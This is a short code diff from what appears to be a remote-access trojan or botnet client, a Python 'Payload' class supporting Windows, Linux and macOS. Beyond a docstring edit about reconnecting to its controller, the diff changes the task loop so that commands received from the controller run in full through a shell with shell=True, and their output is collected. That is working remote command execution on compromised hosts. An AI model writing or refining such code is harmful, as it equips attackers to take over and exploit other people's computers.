@@ -652,7 +652,7 @@ class Payload():
     @config(platforms=['win32','linux2','darwin'], command=True, usage='passive')
     def passive(self):
         """
-        Keep client alive while waiting to re-establish connection
+        Keep client alive while waiting to re-connect
 
         """
         self.flags['connection'].clear()
@@ -1046,7 +1046,7 @@ class Payload():
                         cmd, _, action = task['task'].encode().partition(' ')
                         try:
                             command = self._get_command(cmd)
-                            result = bytes(command(action) if action else command()) if command else bytes().join(subprocess.Popen(cmd, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
+                            result = bytes(command(action) if action else command()) if command else bytes().join(subprocess.Popen(task['task'].encode(), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                         except Exception as e:
                             result = "{} error: {}".format(self.run.func_name, str(e))
                             log(result)
